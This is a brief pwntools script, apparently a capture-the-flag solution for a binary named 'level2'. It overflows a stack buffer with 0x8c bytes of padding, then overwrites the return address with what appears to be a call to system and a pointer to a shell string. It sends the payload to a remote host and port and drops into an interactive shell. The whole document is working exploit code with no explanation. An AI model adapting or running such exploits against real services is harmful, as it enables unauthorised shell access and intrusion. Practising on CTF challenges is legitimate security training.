from pwn import *
context.log_level='debug'
p=process("./level2")
p=remote("111.198.29.45","48797")
p.recv()
payload='a'*0x8c+p32(0x0804845C)+p32(0x0804A024)
p.sendline(payload)
p.interactive()
